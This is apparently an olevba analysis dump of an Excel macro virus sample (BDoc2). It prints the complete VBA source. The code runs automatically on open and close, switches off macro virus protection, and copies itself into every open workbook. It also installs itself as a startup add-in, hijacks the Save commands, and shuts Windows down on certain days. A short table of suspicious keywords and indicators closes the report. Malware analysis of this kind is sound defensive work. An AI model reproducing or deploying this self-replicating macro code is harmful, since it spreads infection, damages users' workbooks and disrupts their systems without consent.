olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO bdoc2.bas 
in file: Virus.MSExcel.BDoc2.c-cefac4ea3d8c10a78eb4ad1a08f6b17d18414463 - OLE stream: '_VBA_PROJECT_CUR/VBA/bdoc2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Dim SS As String
 Sub Auto_Open()
On Error Resume Next
d3
d1
End Sub
 Sub Auto_Close()
On Error Resume Next
d1
End Sub
 Sub Auto_Exec()
On Error Resume Next
Application.DisplayAlerts = False
Application.ScreenUpdating = False
Options.VirusProtection = False
End Sub
 Sub Auto_Exit()
On Error Resume Next
If Day(Now) = 26 Then
    If Month(Now) = 4 Then
        MsgBox "퀭賈痰돨角돝경흡숭,헝Email To:zdqjs@sina.com 璣헹곤燎", vbCritical
    Else
        MsgBox "퀭賈痰돨角돝경흡숭", vbCritical
    End If
    
End If
If Day(Now) Mod 5 = 0 Then Shell ("RUNDLL32.EXE user.exe,exitwindows")
End Sub
Public Sub d1()
On Error Resume Next
SS = ""
pp = ThisWorkbook.VBProject.VBComponents("bdoc2").CodeModule.CountOfLines
SS = ThisWorkbook.VBProject.VBComponents("bdoc2").CodeModule.Lines(1, pp)
If SS = "" Then GoTo Label_Exit
     For I = 1 To Workbooks.Count
       Dname = Workbooks(I).FullName
       If Left$(Dname, 8) = "Document" Then GoTo Label_Next
       If Workbooks(I).VBProject.Protection = 1 Then GoTo Label_Next
       LL = -999999
       LL = Workbooks(I).VBProject.VBComponents("bdoc2").CodeModule.CountOfLines
       If LL = -999999 Then
          Set doc = Workbooks(I).VBProject.VBComponents.Add(1)
          doc.Name = "bdoc2"
          Workbooks(I).VBProject.VBComponents(doc.Name).CodeModule.AddFromString SS
          Workbooks(I).Save 'As FileName:=Dname
       End If
Label_Next:
     Next I
Label_Exit:
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
End Sub

Sub d2()
'
End Sub

Sub d3()
On Error Resume Next
Application.DisplayAlerts = False
Application.ScreenUpdating = False

CommandBars("Tools").Protection = msoBarNoCustomize
For I = 1 To CommandBars("Tools").Controls.Count
aa = Left(CommandBars("Tools").Controls(I).Caption, 3)
If Left(aa, 1) = "브" Or aa = "菱땍屢" Then
CommandBars("Tools").Controls(I).Visible = False
End If
Next I

CommandBars("File").Protection = msoBarNoCustomize
CommandBars("standard").Protection = msoBarNoCustomize

nnn = "AutoRun.xla"
LL = -999999
LL = Workbooks(nnn).VBProject.VBComponents("bdoc2").CodeModule.CountOfLines
nnn = Application.StartupPath & "\" & nnn
If LL = -999999 Then
    ThisWorkbook.Activate
    ActiveWindow.Visible = False
    ThisWorkbook.IsAddin = True
    ThisWorkbook.TemplateRemoveExtData = True
    ThisWorkbook.SaveLinkValues = False
    mmm = ThisWorkbook.FullName
    ThisWorkbook.SaveAs nnn, 18
    Workbooks.Open mmm
End If
    For I = 1 To 6
        If Left(CommandBars("File").Controls(I).Caption, 2) = "괏닸" Then CommandBars("File").Controls(I).OnAction = nnn & "!Auto_Save"
        If Left(CommandBars("standard").Controls(I).Caption, 2) = "괏닸" Then CommandBars("standard").Controls(I).OnAction = nnn & "!Auto_Save"
    Next I
End Sub

Public Sub Auto_Save()
On Error Resume Next
    d1
    d3
    ActiveWorkbook.Save
    Auto_Exit
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RUNDLL32.EXE        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

